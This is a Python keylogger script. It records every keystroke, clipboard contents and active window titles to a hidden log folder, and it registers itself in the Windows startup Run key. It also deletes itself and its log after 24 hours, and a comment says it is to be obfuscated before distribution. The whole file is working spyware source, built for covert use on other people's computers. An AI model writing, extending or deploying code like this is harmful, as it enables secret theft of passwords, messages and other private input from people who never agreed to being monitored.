import os
import time
from datetime import datetime
from pynput import keyboard
import threading
import zipfile
import logging

# Log file details
log_dir = os.path.expanduser("~/.keylogger_logs")
log_file = os.path.join(log_dir, "keylog.txt")

# Ensure log directory exists
os.makedirs(log_dir, exist_ok=True)

# Setup internal logging for debugging
internal_log = os.path.join(log_dir, "internal_log.txt")
logging.basicConfig(filename=internal_log, level=logging.DEBUG, format='%(asctime)s - %(message)s')

# Hidden execution: Add to startup (Windows-specific)
def add_to_startup():
    try:
        import winreg as reg
        file_path = os.path.realpath(__file__)
        key = reg.HKEY_CURRENT_USER
        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(open_key, "KeyloggerApp", 0, reg.REG_SZ, file_path)
        reg.CloseKey(open_key)
    except Exception as e:
        logging.error(f"Failed to add to startup: {e}")

# Advanced Logging Features: Application tracking
def log_active_window():
    try:
        import win32gui
        active_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        with open(log_file, "a") as file:
            file.write(f"{datetime.now()} - Active Window: {active_window}\n")
    except Exception as e:
        logging.error(f"Failed to log active window: {e}")

# Advanced Logging Features: Clipboard logging
def log_clipboard():
    try:
        import pyperclip
        clipboard_data = pyperclip.paste()
        with open(log_file, "a") as file:
            file.write(f"{datetime.now()} - Clipboard: {clipboard_data}\n")
    except Exception as e:
        logging.error(f"Failed to log clipboard: {e}")

# Self-destruction timer
def self_destruct_timer(hours=24):
    try:
        time.sleep(hours * 3600)
        os.remove(__file__)
        os.remove(log_file)
    except Exception as e:
        logging.error(f"Self-destruction failed: {e}")

# Compress logs to save space
def compress_logs():
    try:
        zip_file = os.path.join(log_dir, "logs.zip")
        with zipfile.ZipFile(zip_file, "w") as zipf:
            zipf.write(log_file, os.path.basename(log_file))
        logging.info("Logs compressed successfully.")
    except Exception as e:
        logging.error(f"Failed to compress logs: {e}")

# Obfuscation: Placeholder for using pyarmor or external tools
def obfuscate_script():
    logging.info("Script obfuscation should be done externally before distribution.")

# Handle key press
def on_press(key):
    try:
        with open(log_file, "a") as file:
            if hasattr(key, 'char') and key.char:
                file.write(f"{datetime.now()} - {key.char}\n")
            else:
                file.write(f"{datetime.now()} - [{key}]\n")
    except Exception as e:
        logging.error(f"Failed to log key press: {e}")

# Multi-language support: Basic compatibility by capturing all keys
def multi_language_support():
    # No additional implementation required; the current method supports multi-language input
    logging.info("Multi-language support enabled.")

# Listener and additional logging threads
def start_keylogger():
    try:
        # Start keylogger listener
        with keyboard.Listener(on_press=on_press) as listener:
            # Launch additional logging features in parallel
            threading.Thread(target=log_clipboard, daemon=True).start()
            threading.Thread(target=log_active_window, daemon=True).start()
            threading.Thread(target=compress_logs, daemon=True).start()
            threading.Thread(target=self_destruct_timer, args=(24,), daemon=True).start()
            listener.join()
    except Exception as e:
        logging.error(f"Keylogger failed to start: {e}")

# Entry point
if __name__ == "__main__":
    add_to_startup()
    obfuscate_script()  # Run external obfuscation before distribution
    multi_language_support()
    start_keylogger()
